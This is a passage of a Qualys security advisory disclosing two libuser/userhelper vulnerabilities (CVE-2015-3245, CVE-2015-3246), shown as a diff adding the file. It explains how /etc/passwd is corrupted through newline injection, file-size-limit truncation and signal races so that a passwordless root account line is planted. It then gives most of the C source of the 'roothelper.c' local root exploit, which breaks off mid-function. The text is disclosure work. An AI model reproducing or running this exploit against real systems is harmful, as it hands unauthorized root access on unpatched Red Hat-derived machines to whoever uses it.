@@ -1,0 +1,1315 @@
+Qualys Security Advisory
+
+CVE-2015-3245 userhelper chfn() newline filtering
+
+CVE-2015-3246 libuser passwd file handling
+
+
+--[ Summary ]-----------------------------------------------------------------
+
+The libuser library implements a standardized interface for manipulating
+and administering user and group accounts, and is installed by default
+on Linux distributions derived from Red Hat's codebase. During an
+internal code audit at Qualys, we discovered multiple libuser-related
+vulnerabilities that allow local users to perform denial-of-service and
+privilege-escalation attacks. As a proof of concept, we developed an
+unusual local root exploit against one of libuser's applications.
+
+
+----[ Vulnerability #1 (CVE-2015-3245 userhelper chfn() newline filtering)
+
+We discovered a bug in userhelper, a setuid-root program from the
+usermode package that provides a basic interface to change a user's
+password, gecos information, and shell; its -f (Full Name), -o (Office),
+-p (Office Phone) and -h (Home Phone) command-line options are
+equivalent to those of the traditional chfn program.
+
+userhelper's chfn() function verifies that the fields it was given on
+the command-line are sane (i.e., contain no forbidden characters).
+Unfortunately, these forbidden characters (":,=") do not include '\n'
+and allow local attackers to inject newline characters into /etc/passwd
+and alter this file in unexpected ways.
+
+To the best of our knowledge, this bug is a local denial-of-service
+only: we were not able to turn it into a local root exploit, but maybe
+some creative minds will.
+
+There is another, secondary aspect of this bug: userhelper depends on
+libuser to modify /etc/passwd, and libuser's format_generic() and
+generic_setpass() functions reject fields containing a ':' that would be
+interpreted as a field separator. Vulnerability #1 could have been
+prevented if libuser had also rejected '\n' characters.
+
+
+----[ Vulnerability #2 (CVE-2015-3246 libuser passwd file handling)
+
+We discovered a bug in libuser itself: even though traditional programs
+like passwd, chfn, and chsh work on a temporary copy of /etc/passwd and
+eventually rename() it, libuser modifies /etc/passwd directly.
+Unfortunately, if anything goes wrong during these modifications,
+libuser may leave /etc/passwd in an inconsistent state.
+
+This bug is not just another local denial-of-service: we were able to
+turn it into a local root exploit against userhelper and chfn (if linked
+with libuser).
+
+There is also another, secondary aspect of this bug: glibc modules like
+nss and nscd do not expect /etc/passwd to be directly modified while
+they parse its contents, and programs from packages like shadow-utils
+and util-linux use lckpwdf() locks that are incompatible with libuser's
+fcntl() locks.
+
+
+--[ Exploitation Overview ]---------------------------------------------------
+
+In this section, we outline our userhelper exploit against libuser's
+Vulnerability #2; later in this advisory, we explain how it can be
+easily adapted to chfn (if linked with libuser).
+
+Our ultimate goal is to inject an arbitrary line into /etc/passwd (for
+example, the a-line "\na::0:0::/:\n") but we first need to understand
+how libuser's generic_mod() function modifies our own user's line in
+/etc/passwd:
+
+- open() /etc/passwd for reading and writing (O_RDWR, but not O_APPEND
+  nor O_TRUNC);
+
+- acquire the file's fcntl() write-lock (an exclusive, but advisory
+  lock);
+
+- read() the file's contents (into a g_malloc()ated buffer);
+
+- lseek() the file to the beginning of our user's line (and skip the
+  unmodified lines that precede);
+
+- write() our user's new, modified line (and the rest of the unmodified
+  lines that follow) to the file;
+
+- ftruncate() the file (if our user's new, modified line is shorter than
+  the old one);
+
+- release the file's fcntl() write-lock;
+
+- close() the file.
+
+Surprisingly, we only need two things in our toolbox in order to exploit
+this function and inject the a-line into /etc/passwd:
+
+- a pencil and eraser that allows us to repeatedly write() and
+  re-write() our own GECOS field (its length and last character in
+  particular) in /etc/passwd: the userhelper program itself;
+
+- a pair of scissors that allows us to interrupt write() with byte
+  precision and avoid ftruncate(): the resource limit RLIMIT_FSIZE, "The
+  maximum size of files that the process may create. Attempts to extend
+  a file beyond this limit result in delivery of a SIGXFSZ signal. By
+  default, this signal terminates a process, but a process can catch
+  this signal instead, in which case the relevant system call (e.g.,
+  write(2), truncate(2)) fails with the error EFBIG."
+
+For each character in the a-line (beginning with its last character and
+ending with its first character), we fork() a new process and execve()
+userhelper with:
+
+- a GECOS field that allows us to write() the character to its target
+  offset in /etc/passwd;
+
+- an RLIMIT_FSIZE that allows us to terminate the process before it
+  write()s or ftruncate()s the characters that follow.
+
+In this example, the newline character '\n' is represented by |, and the
+last character written (before write() is interrupted by RLIMIT_FSIZE)
+is marked with ^:
+
+...|...|user:x:1000:1000::/home/user:/bin/bash|...|...|
+...|...|user:x:1000:1000:AAAAAAAAAAAAAAAAAAA:/home/user:/bin/bash|...|...|
+...|...|user:x:1000:1000:AAAAAAAAAAAAAAAAAAAAAAAAAAAA:/home/user:|...|...|
+                                                                ^
+...|...|user:x:1000:1000:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:/home/:|...|...|
+                                                               ^
+...|...|user:x:1000:1000:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:/:|...|...|
+                                                              ^
+...|...|user:x:1000:1000:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA::/:|...|...|
+                                                             ^
+...|...|user:x:1000:1000:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0::/:|...|...|
+                                                            ^
+...|...|user:x:1000:1000:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:0::/:|...|...|
+                                                           ^
+...|...|user:x:1000:1000:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0:0::/:|...|...|
+                                                          ^
+...|...|user:x:1000:1000:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:0:0::/:|...|...|
+                                                         ^
+...|...|user:x:1000:1000:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA::0:0::/:|...|...|
+                                                        ^
+...|...|user:x:1000:1000:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa::0:0::/:|...|...|
+                                                       ^
+...|...|user:x:1000:1000:AAAAAAAA:/home/user:/bin/bash|a::0:0::/:|...|...|
+                                                      ^
+...|...|user:x:1000:1000::/home/user:/bin/bash|a::0:0::/:|...|...|
+
+
+--[ Exploitation Details ]----------------------------------------------------
+
+In this section, we discuss the problems we encountered while developing
+our userhelper exploit, and how we solved them.
+
+
+----[ Problem #1 (missing fields)
+
+At the end of our "Exploitation Overview" example, our home-directory
+and shell-program fields seem to magically reappear in /etc/passwd,
+although they were previously cut out by RLIMIT_FSIZE.
+
+This magic trick introduces Problem #1: we cannot simply fork() a new
+process for each character in the a-line, execve() userhelper, and let
+it run until the character is written to its target offset in
+/etc/passwd, because libuser refuses to modify our user's line if some
+of its fields are missing.
+
+In order to solve this Problem #1, we fork() a new process for each
+character in the a-line, execve() userhelper, and let it load our user's
+original, uncut line from /etc/passwd, but we SIGSTOP the process before
+it open()s /etc/passwd for writing. Only after we have started and
+stopped all userhelper processes can we safely SIGCONT them, one at a
+time.
+
+
+----[ Problem #2 (backup file)
+
+Before libuser open()s /etc/passwd for writing, it creates a backup file
+named /etc/passwd- and if this backup fails, libuser refuses to modify
+/etc/passwd. Unfortunately, our RLIMIT_FSIZE also applies to the backup,
+which will fail if the RLIMIT_FSIZE is less than the size of
+/etc/passwd.
+
+This introduces Problem #2: in apparent contradiction to what we just
+said, our exploit needs to decrease RLIMIT_FSIZE after each character it
+injects into /etc/passwd (as shown in the "Exploitation Overview"
+example).
+
+In order to solve this Problem #2, we refine Problem #1's
+SIGSTOP/SIGCONT solution: we let each userhelper process load our user's
+original, uncut line from /etc/passwd, and SIGSTOP the process after it
+creates the backup file but before it modifies /etc/passwd. In other
+words, we have to win a race against generic_mod()'s system calls, which
+create the backup file and modify /etc/passwd:
+
+- open() the passwd file /etc/passwd for reading;
+- acquire the passwd file's fcntl() read-lock;
+
+- open() the backup file /etc/passwd- for writing;
+- acquire the backup file's fcntl() write-lock;
+
+- read() from the passwd file;
+- write() to the backup file;
+- ftruncate() the backup file;
+
+- release the backup file's fcntl() write-lock;
+- close() the backup file;
+
+- release the passwd file's fcntl() read-lock;
+- close() the passwd file;
+
+- open() /etc/passwd for reading and writing;
+[RACE WINDOW BEGINS]
+- acquire the file's fcntl() write-lock: failure, sleep for a few microseconds;
+- acquire the file's fcntl() write-lock: failure, sleep for a few microseconds;
+- acquire the file's fcntl() write-lock: failure, sleep for a few microseconds;
+[RACE WINDOW ENDS]
+- acquire the file's fcntl() write-lock: success;
+- read() the file's contents;
+- etc.
+
+In order to reliably win this race against all userhelper processes (one
+for each character in the a-line), we:
+
+- widen the race window. We acquire a read-lock on /etc/passwd before we
+  execve() userhelper, which prevents libuser from acquiring the
+  write-lock on /etc/passwd, and forces it to sleep for a few
+  microseconds (LU_LOCK_TIMEOUT is 2, LU_MAX_LOCK_ATTEMPTS is 6).
+
+- pinpoint the race window. We monitor the filesystem for the following
+  sequence of inotify events:
+
+  . IN_CREATE on /etc if the backup file does not exist;
+  . IN_CLOSE_WRITE on the backup file;
+  . IN_CLOSE_NOWRITE on the passwd file;
+  . IN_OPEN on the passwd file.
+
+- preempt the userhelper processes. We setpriority() them to the lowest
+  priority, sched_setscheduler() them to SCHED_IDLE, and
+  sched_setaffinity() them to the same CPU as our exploit.
+
+
+----[ Problem #3 (last user)
+
+If our user's line is the last one in /etc/passwd, then the last
+character we inject into the file (the '\n' that ends our user's line
+and begins the a-line) is also the very last character of write()'s
+buffer, which introduces Problem #3: this last write() will not exceed
+our RLIMIT_FSIZE, and the consequent ftruncate() will delete the a-line
+from the end of /etc/passwd.
+
+In order to solve this Problem #3:
+
+- either we SIGKILL the last userhelper process after write() but before
+  ftruncate(). We reliably win this race with an IN_MODIFY event on
+  /etc/passwd and the "same CPU, different priorities" preemption of
+  userhelper.
+
+- or we exploit Vulnerability #1 and inject a '\n' into our own GECOS
+  field. As far as libuser is concerned, this '\n' ends our user's line
+  and begins a new one (with our leftover home-directory and
+  shell-program fields): our user's line is no longer the last one in
+  /etc/passwd.
+
+
+----[ Problem #4 (maximum GECOS_LENGTH)
+
+As shown in our "Exploitation Overview" example, we only have two
+options for arbitrary character injection into /etc/passwd:
+
+- either we use a character that we artificially inject through our own
+  GECOS field (not an option for characters like ':' and '\n');
+
+- or we reuse a character that is naturally present in /etc/passwd (our
+  only option for characters like ':' and '\n').
+
+Unfortunately, both of these options might fail to inject a character
+after the end of /etc/passwd (a consequence of Problem #2):
+
+- if our own GECOS field is too far away from the end of /etc/passwd
+  (farther than userhelper's maximum GECOS_LENGTH, 127 characters);
+
+- if the character is not already one of the last GECOS_LENGTH
+  characters in /etc/passwd.
+
+If faced with both of these problems, we solve the first one (and
+Problem #4) by repeatedly deleting lines from the end of /etc/passwd,
+until our own user's line is the last one in the file: we enlarge our
+own GECOS field, delete characters from the end of /etc/passwd with our
+RLIMIT_FSIZE scissors, shrink our GECOS field again, repeat.
+
+
+----[ Problem #5 (time complexity)
+
+For each character in the a-line, we usually have to choose one of
+several (GECOS, RLIMIT_FSIZE) pairs that allow us to write the character
+to its target offset in /etc/passwd.
+
+These pairs represent the nodes of a search tree that grows
+exponentially (with the number of characters in the a-line) but may
+contain few or no solutions. In order to avoid this tree's worst-case
+time complexity, we:
+
+- inject the shortest a-line possible, "\na::0:0::/:\n";
+
+- perform a recursive depth-first search on the tree, and return the
+  first solution we find (instead of, for example, the solution that
+  minimizes /etc/passwd's alterations);
+
+- replace the a-line's username with a wildcard, and accept any
+  lowercase character that is not already a username (the a-line's
+  username was a major problem, because it is the last character we
+  inject, and therefore occurs deep down the tree's branches; the
+  a-line's '0' characters are only a minor problem, because they occur
+  in the middle of the tree's branches, whence we can backtrack
+  quickly).
+
+
+----[ chfn
+
+util-linux's chfn from Red Hat's codebase is linked with libuser, and
+can be exploited by our public roothelper.c with just a few changes
+(left as an exercise for the interested reader):
+
+- userhelper uses a simple Userhelper/Consolehelper request/response
+  protocol in order to prompt for and read the user's password, but chfn
+  uses traditional terminal interaction;
+
+- if our user's line is the last one in /etc/passwd, we can exploit
+  Vulnerability #1 against userhelper, but we have to win Problem #3's
+  write/ftruncate race against chfn;
+
+- userhelper returns 0/255 on success/failure, but chfn returns 0/1.
+
+
+--[ Acknowledgments ]---------------------------------------------------------
+
+We would like to thank Red Hat's Security Response Team and developers
+for promptly addressing these issues.
+
+
+
+------ roothelper.c exploit ------
+/*
+ * roothelper.c - an unusual local root exploit against:
+ * CVE-2015-3245 userhelper chfn() newline filtering
+ * CVE-2015-3246 libuser passwd file handling
+ * Copyright (C) 2015 Qualys, Inc.
+ *
+ * gecos_* types and functions inspired by userhelper.c
+ * Copyright (C) 1997-2003, 2007, 2008 Red Hat, Inc.
+ *
+ * UH_* #defines and comments inspired by userhelper.h
+ * Copyright (C) 1997-2001, 2007 Red Hat, Inc.
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program.  If not, see <http://www.gnu.org/licenses/>.
+ */
+
+#define _GNU_SOURCE
+#include <ctype.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <inttypes.h>
+#include <limits.h>
+#include <pwd.h>
+#include <sched.h>
+#include <signal.h>
+#include <stdarg.h>
+#include <stdbool.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/inotify.h>
+#include <sys/resource.h>
+#include <sys/socket.h>
+#include <sys/stat.h>
+#include <sys/time.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <unistd.h>
+
+/* A maximum GECOS field length.  There's no hard limit, so we guess. */
+#define GECOS_LENGTH                    127
+
+typedef char gecos_field[GECOS_LENGTH];
+
+/* A structure to hold broken-out GECOS data.  The number and names of the
+ * fields are dictated entirely by the flavor of finger we use.  Seriously. */
+struct gecos_data {
+    gecos_field full_name;      /* full user name */
+    gecos_field office;         /* office */
+    gecos_field office_phone;   /* office phone */
+    gecos_field home_phone;     /* home phone */
+    gecos_field site_info;      /* other stuff */
+};
+
+static struct userhelper {
+    struct gecos_data gecos;
+    rlim_t fsizelim;
+    pid_t pid;
+    int fd;
+} userhelpers[GECOS_LENGTH];
+
+static void
+die_in_parent(const char *const file, const unsigned int line,
+              const char *const function)
+{
+    fprintf(stderr, "died in parent: %s:%u: %s\n", file, line, function);
+    fflush(stderr);
+
+    unsigned int i;
+    for (i = 0; i < GECOS_LENGTH; i++) {
+        const pid_t pid = userhelpers[i].pid;
+        if (pid <= 0) continue;
+        kill(pid, SIGKILL);
+    }
+    _exit(EXIT_FAILURE);
+}
+
+static void
+die_in_child(const char *const file, const unsigned int line,
+             const char *const function)
+{
+    fprintf(stderr, "died in child: %s:%u: %s\n", file, line, function);
+    exit(EXIT_FAILURE);
+}
+
+static void (*die_fn)(const char *, unsigned int, const char *) = die_in_parent;
+#define die() die_fn(__FILE__, __LINE__, __func__)
+
+static void *
+xmalloc(const size_t size)
+{
+    if (size <= 0) die();
+    if (size >= INT_MAX) die();
+    void *const ptr = malloc(size);
+    if (ptr == NULL) die();
+    return ptr;
+}
+
+static void *
+xrealloc(void *const old, const size_t size)
+{
+    if (size <= 0) die();
+    if (size >= INT_MAX) die();
+    void *const new = realloc(old, size);
+    if (new == NULL) die();
+    return new;
+}
+
+static char *
+xstrndup(const char *const old, const size_t len)
+{
+    if (old == NULL) die();
+    if (len >= INT_MAX) die();
+
+    char *const new = strndup(old, len);
+
+    if (new == NULL) die();
+    if (len != strlen(new)) die();
+    return new;
+}
+
+static int
+xsnprintf(char *const str, const size_t size, const char *const format, ...)
+{
+    if (str == NULL) die();
+    if (size <= 0) die();
+    if (size >= INT_MAX) die();
+    if (format == NULL) die();
+
+    va_list ap;
+    va_start(ap, format);
+    const int len = vsnprintf(str, size, format, ap);
+    va_end(ap);
+
+    if (len < 0) die();
+    if ((unsigned int)len >= size) die();
+    if ((unsigned int)len != strlen(str)) die();
+    return len;
+}
+
+static int
+xopen(const char *const pathname, const int flags)
+{
+    if (pathname == NULL) die();
+    if (*pathname != '/') die();
+    if (flags != O_RDONLY) die();
+
+    const int fd = open(pathname, flags);
+    if (fd <= -1) die();
+
+    static const struct flock rdlock = {
+        .l_type = F_RDLCK,
+        .l_whence = SEEK_SET,
+        .l_start = 0,
+        .l_len = 0
+    };
+    if (fcntl(fd, F_SETLK, &rdlock) != 0) die();
+    return fd;
+}
+
+static void
+xclose(const int fd)
+{
+    if (fd <= -1) die();
+    static const struct flock unlock = {
+        .l_type = F_UNLCK,
+        .l_whence = SEEK_SET,
+        .l_start = 0,
+        .l_len = 0
+    };
+    if (fcntl(fd, F_SETLK, &unlock) != 0) die();
+    if (close(fd) != 0) die();
+}
+
+#define GECOS_BADCHARS ":,=\n"
+
+/* A simple function to compute the size of a gecos string containing the
+ * data we have. */
+static size_t
+gecos_size(const struct gecos_data *const parsed)
+{
+    if (parsed == NULL) die();
+
+    size_t len = 4; /* commas! */
+    len += strlen(parsed->full_name);
+    len += strlen(parsed->office);
+    len += strlen(parsed->office_phone);
+    len += strlen(parsed->home_phone);
+    len += strlen(parsed->site_info);
+    len++;
+    return len;
+}
+
+/* Parse the passed-in GECOS string and set PARSED to its broken-down contents.
+   Note that the parsing is performed using the convention obeyed by BSDish
+   finger(1) under Linux. */
+static void
+gecos_parse(const char *const gecos, struct gecos_data *const parsed)
+{
+    if (gecos == NULL) die();
+    if (strlen(gecos) >= INT_MAX) die();
+
+    if (parsed == NULL) die();
+    memset(parsed, 0, sizeof(*parsed));
+
+    unsigned int i;
+    const char *field = gecos;
+
+    for (i = 0; ; i++) {
+        const char *field_end = strchrnul(field, ',');
+        gecos_field *dest = NULL;
+
+        switch (i) {
+        case 0:
+            dest = &parsed->full_name;
+            break;
+        case 1:
+            dest = &parsed->office;
+            break;
+        case 2:
+            dest = &parsed->office_phone;
+            break;
+        case 3:
+            dest = &parsed->home_phone;
+            break;
+        case 4:
+            field_end = rawmemchr(field_end, '\0');
+            dest = &parsed->site_info;
+            break;
+        default:
+            die();
+        }
+        const size_t field_len = field_end - field;
+        xsnprintf(*dest, sizeof(*dest), "%.*s", (int)field_len, field);
+        if (strlen(*dest) != field_len) die();
+
+        if (strpbrk(*dest, GECOS_BADCHARS) != NULL && i != 4) die();
+
+        if (*field_end == '\0') break;
+        field = field_end + 1;
+    }
+    if (gecos_size(parsed) > GECOS_LENGTH) die();
+}
+
+/* Assemble a new gecos string. */
+static const char *
+gecos_assemble(const struct gecos_data *const parsed)
+{
+    static char ret[GECOS_LENGTH];
+    size_t i;
+
+    if (parsed == NULL) die();
+    /* Construct the basic version of the string. */
+    xsnprintf(ret, sizeof(ret), "%s,%s,%s,%s,%s",
+                                parsed->full_name,
+                                parsed->office,
+                                parsed->office_phone,
+                                parsed->home_phone,
+                                parsed->site_info);
+    /* Strip off terminal commas. */
+    i = strlen(ret);
+    while ((i > 0) && (ret[i - 1] == ',')) {
+        ret[i - 1] = '\0';
+        i--;
+    }
+    return ret;
+}
+
+/* Descriptors used to communicate between userhelper and consolhelper. */
+#define UH_INFILENO 3
+#define UH_OUTFILENO 4
+
+/* Userhelper request format:
+   request code as a single character,
+   request data size as UH_REQUEST_SIZE_DIGITS decimal digits
+   request data
+   '\n' */
+#define UH_REQUEST_SIZE_DIGITS 8
+
+/* Synchronization point code. */
+#define UH_SYNC_POINT 32
+
+/* Valid userhelper request codes. */
+#define UH_ECHO_ON_PROMPT 34
+#define UH_ECHO_OFF_PROMPT 35
+#define UH_EXPECT_RESP 39
+#define UH_SERVICE_NAME 40
+#define UH_USER 42
+
+/* Consolehelper response format:
+   response code as a single character,
+   response data
+   '\n' */
+
+/* Consolehelper response codes. */
+#define UH_TEXT 33
+
+/* Valid userhelper error codes. */
+#define ERR_UNK_ERROR           255     /* unknown error */
+
+/* Paths, flag names, and other stuff. */
+#define UH_PATH "/usr/sbin/userhelper"
+#define UH_FULLNAME_OPT "-f"
+#define UH_OFFICE_OPT "-o"
+#define UH_OFFICEPHONE_OPT "-p"
+#define UH_HOMEPHONE_OPT "-h"
+
+static char
+read_request(const int fd, char *const data, const size_t size)
+{
+    if (fd <= -1) die();
+    if (data == NULL) die();
+    if (size >= INT_MAX) die();
+
+    char header[1 + UH_REQUEST_SIZE_DIGITS + 1];
+    if (read(fd, header, sizeof(header)-1) != sizeof(header)-1) die();
+    header[sizeof(header)-1] = '\0';
+
+    errno = 0;
+    char *endptr = NULL;
+    const unsigned long len = strtoul(&header[1], &endptr, 10);
+    if (errno != 0 || endptr != &header[sizeof(header)-1]) die();
+
+    if (len >= size) die();
+    if (read(fd, data, len+1) != (ssize_t)(len+1)) die();
+    if (data[len] != '\n') die();
+    data[len] = '\0';
+
+    if (strlen(data) != len) die();
+    if (strchr(data, '\n') != NULL) die();
+    return header[0];
+}
+
+static void
+send_reply(const int fd, const unsigned char type, const char *const data)
+{
+    if (fd <= -1) die();
+    if (!isascii(type)) die();
+    if (!isprint(type)) die();
+    if (data == NULL) die();
+    if (strpbrk(data, "\r\n") != NULL) die();
+
+    char buf[BUFSIZ];
+    const int len = xsnprintf(buf, sizeof(buf), "%c%s\n", (int)type, data);
+    if (send(fd, buf, len, MSG_NOSIGNAL) != len) die();
+}
+
+#define ETCDIR "/etc"
+#define PASSWD "/etc/passwd"
+#define BACKUP "/etc/passwd-"
+
+static struct {
+    char username[64];
+    char password[64];
+    struct gecos_data gecos;
+} my;
+
+static volatile sig_atomic_t is_child_dead;
+
+static void
+sigchild_handler(const int signum __attribute__ ((__unused__)))
+{
+    is_child_dead = true;
+}
+
+static int
+wait_for_userhelper(struct userhelper *const uh, const int options)
+{
+    if (uh == NULL) die();
+    if (uh->pid <= 0) die();
+    if ((options & ~(WUNTRACED | WCONTINUED)) != 0) die();
+
+    int status;
+    for (;;) {
+        const pid_t pid = waitpid(uh->pid, &status, options);
+        if (pid == uh->pid) break;
+        if (pid > 0) _exit(255);
+
+        if (pid != -1) die();
+        if (errno != EINTR) die();
+    }
+    if (WIFEXITED(status) || WIFSIGNALED(status)) uh->pid = -1;
+    return status;
+}
+
+static void
+forkstop_userhelper(struct userhelper *const uh)
+{
+    if (uh == NULL) die();
+    if (uh->pid != 0) die();
+    if (gecos_size(&uh->gecos) > GECOS_LENGTH) die();
+
+    struct rlimit fsize;
+    if (getrlimit(RLIMIT_FSIZE, &fsize) != 0) die();
+    if (uh->fsizelim > fsize.rlim_max) die();
+    if (uh->fsizelim <= 0) die();
+    fsize.rlim_cur = uh->fsizelim;
+
+    cpu_set_t old_cpus;
+    CPU_ZERO(&old_cpus);
+    if (sched_getaffinity(0, sizeof(old_cpus), &old_cpus) != 0) die();
+
+    { const int cpu = sched_getcpu();
+    if (cpu >= CPU_SETSIZE) die();
+    if (cpu < 0) die();
+    cpu_set_t new_cpus;
+    CPU_ZERO(&new_cpus);
+    CPU_SET(cpu, &new_cpus);
+    if (sched_setaffinity(0, sizeof(new_cpus), &new_cpus) != 0) die(); }
+
+    int sv[2];
+    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) != 0) die();
+
+    if (is_child_dead) die();
+    static const struct sigaction sigchild_action = {
+        .sa_handler = sigchild_handler, .sa_flags = SA_NOCLDSTOP };
+    if (sigaction(SIGCHLD, &sigchild_action, NULL) != 0) die();
+
+    uh->pid = fork();
+    if (uh->pid <= -1) die();
+
+    if (uh->pid == 0) {
+        die_fn = die_in_child;
+        if (close(sv[1]) != 0) die();
+        if (dup2(sv[0], UH_INFILENO) != UH_INFILENO) die();
+        if (dup2(sv[0], UH_OUTFILENO) != UH_OUTFILENO) die();
+
+        const int devnull_fd = open("/dev/null", O_RDWR);
+        if (dup2(devnull_fd, STDIN_FILENO) != STDIN_FILENO) die();
+        if (dup2(devnull_fd, STDOUT_FILENO) != STDOUT_FILENO) die();
+        if (dup2(devnull_fd, STDERR_FILENO) != STDERR_FILENO) die();
+
+        if (signal(SIGPIPE, SIG_DFL) == SIG_ERR) die();
+        if (signal(SIGXFSZ, SIG_IGN) == SIG_ERR) die();
+        if (setrlimit(RLIMIT_FSIZE, &fsize) != 0) die();
+
+        if (setpriority(PRIO_PROCESS, 0, +19) != 0) die();
+        static const struct sched_param sched_param = { .sched_priority = 0 };
+        (void) sched_setscheduler(0, SCHED_IDLE, &sched_param);
+
+        char *const argv[] = { UH_PATH,
+                               UH_FULLNAME_OPT,    uh->gecos.full_name,
+                               UH_OFFICE_OPT,      uh->gecos.office,
+                               UH_OFFICEPHONE_OPT, uh->gecos.office_phone,
+                               UH_HOMEPHONE_OPT,   uh->gecos.home_phone,
+                               NULL };
+        char *const envp[] = { NULL };
+        execve(UH_PATH, argv, envp);
+        die();
+    }
+    if (die_fn != die_in_parent) die();
+    if (close(sv[0]) != 0) die();
+    uh->fd = sv[1];
+
+    unsigned long expected_responses = 0;
+    for (;;) {
+        char data[BUFSIZ];
+        const char type = read_request(uh->fd, data, sizeof(data));
+        if (type == UH_SYNC_POINT) break;
+
+        switch (type) {
+        case UH_USER:
+            if (strcmp(data, my.username) != 0) die();
+            break;
+        case UH_SERVICE_NAME:
+            if (strcmp(data, "chfn") != 0) die();
+            break;
+        case UH_ECHO_ON_PROMPT:
+        case UH_ECHO_OFF_PROMPT:
+            if (++expected_responses == 0) die();
+            break;
+        case UH_EXPECT_RESP:
+            if (strtoul(data, NULL, 10) != expected_responses) die();
+            break;
+        default:
+            break;
+        }
+    }
+    if (expected_responses != 1) die();
+
+    const int lpasswd_fd = xopen(PASSWD, O_RDONLY);
+    const int inotify_fd = inotify_init();
+    if (inotify_fd <= -1) die();
+    if (inotify_add_watch(inotify_fd, PASSWD, IN_CLOSE_NOWRITE |
+          IN_OPEN) <= -1) die();
+    if (inotify_add_watch(inotify_fd, BACKUP, IN_CLOSE_WRITE) <= -1) {
+        if (errno != ENOENT) die();
+        if (inotify_add_watch(inotify_fd, ETCDIR, IN_CREATE) <= -1) die();
+    }
+
+    send_reply(uh->fd, UH_TEXT, my.password);
+    send_reply(uh->fd, UH_SYNC_POINT, "");
+    if (close(uh->fd) != 0) die();
+    uh->fd = -1;
+
+    unsigned int state = 0;
+    static const uint32_t transition[] = { IN_CLOSE_WRITE,
+                                           IN_CLOSE_NOWRITE, IN_OPEN, 0 };
+    for (;;) {
+        if (is_child_dead) die();
+        char buffer[10 * (sizeof(struct inotify_event) + NAME_MAX + 1)];
+        const ssize_t _buflen = read(inotify_fd, buffer, sizeof(buffer));
+        if (is_child_dead) die();
+
+        if (_buflen <= 0) die();
+        size_t buflen = _buflen;
+        if (buflen > sizeof(buffer)) die();
+
+        struct inotify_event *ep;
+        for (ep = (struct inotify_event *)(buffer); buflen >= sizeof(*ep);
+             ep = (struct inotify_event *)(ep->name + ep->len)) {
+            buflen -= sizeof(*ep);
+
+            if (ep->len > 0) {
+                if (buflen < ep->len) die();
+                buflen -= ep->len;
+                if ((ep->mask & IN_CREATE) == 0) die();
+                (void) inotify_add_watch(inotify_fd, BACKUP, IN_CLOSE_WRITE);
+                continue;
+            }
+            if (ep->len != 0) die();
+            while ((ep->mask & transition[state]) != 0) {
+                ep->mask &= ~transition[state++];
+                if (transition[state] == 0) goto stop_userhelper;
+            }
+        }
+        if (buflen != 0) die();
+    }
+    stop_userhelper:
+    if (kill(uh->pid, SIGSTOP) != 0) die();
+    if (close(inotify_fd) != 0) die();
+
+    const int status = wait_for_userhelper(uh, WUNTRACED);
+    if (!WIFSTOPPED(status)) die();
+    if (WSTOPSIG(status) != SIGSTOP) die();
+
+    xclose(lpasswd_fd);
+    if (signal(SIGCHLD, SIG_DFL) == SIG_ERR) die();
+    if (sched_setaffinity(0, sizeof(old_cpus), &old_cpus) != 0) die();
+}
+
+static void
+continue_userhelper(struct userhelper *const uh)
+{
+    if (uh == NULL) die();
+    if (uh->fd != -1) die();
+    if (uh->pid <= 0) die();
+
+    if (kill(uh->pid, SIGCONT) != 0) die();
+
+    { const int status = wait_for_userhelper(uh, WCONTINUED);
+    if (!WIFCONTINUED(status)) die(); }
+
+    { const int status = wait_for_userhelper(uh, 0);
+    if (!WIFEXITED(status)) die();
+    if (WEXITSTATUS(status) !=
+          ((uh->fsizelim == RLIM_INFINITY) ? 0 : ERR_UNK_ERROR)) die(); }
+
+    memset(uh, 0, sizeof(*uh));
+}
+
+static void
+create_backup_of_passwd_file(void)
+{
+    char backup[] = "/tmp/passwd-XXXXXX";
+    const mode_t prev_umask = umask(077);
+    const int ofd = mkstemp(backup);
+    (void) umask(prev_umask);
+    if (ofd <= -1) die();
+
+    printf("Creating a backup copy of \"%s\" named \"%s\"\n", PASSWD, backup);
+    const int ifd = xopen(PASSWD, O_RDONLY);
+    for (;;) {
+        char buf[BUFSIZ];
+        const ssize_t len = read(ifd, buf, sizeof(buf));
+        if (len == 0) break;
+        if (len <= 0) die();
+        if (write(ofd, buf, len) != len) die();
+    }
+    xclose(ifd);
+    if (close(ofd) != 0) die();
+}
+
+static void
+delete_lines_from_passwd_file(void)
+{
+    struct gecos_data gecos;
+    memset(&gecos, 0, sizeof(gecos));
+    xsnprintf(gecos.site_info, sizeof(gecos.site_info),
+                             "%s", my.gecos.site_info);
+    const ssize_t fullname_max = GECOS_LENGTH - gecos_size(&gecos);
+    if (fullname_max >= GECOS_LENGTH) die();
+    if (fullname_max <= 0) die();
+
+    char fragment[64];
+    xsnprintf(fragment, sizeof(fragment), "\n%s:", my.username);
+
+    char *contents = NULL;
+    for (;;) {
+        struct stat st;
+        const int fd = xopen(PASSWD, O_RDONLY);
+        if (fstat(fd, &st) != 0) die();
+        if (st.st_size >= INT_MAX) die();
+        if (st.st_size <= 0) die();
+
+        contents = xrealloc(contents, st.st_size + 1);
+        if (read(fd, contents, st.st_size) != st.st_size) die();
+        contents[st.st_size] = '\0';
+        xclose(fd);
+
+        const char *cp = strstr(contents, fragment);
+        if (cp == NULL) die();
+        cp = strchr(cp + 2, '\n');
+        if (cp == NULL) die();
+        if (cp[1] == '\0') break;
+
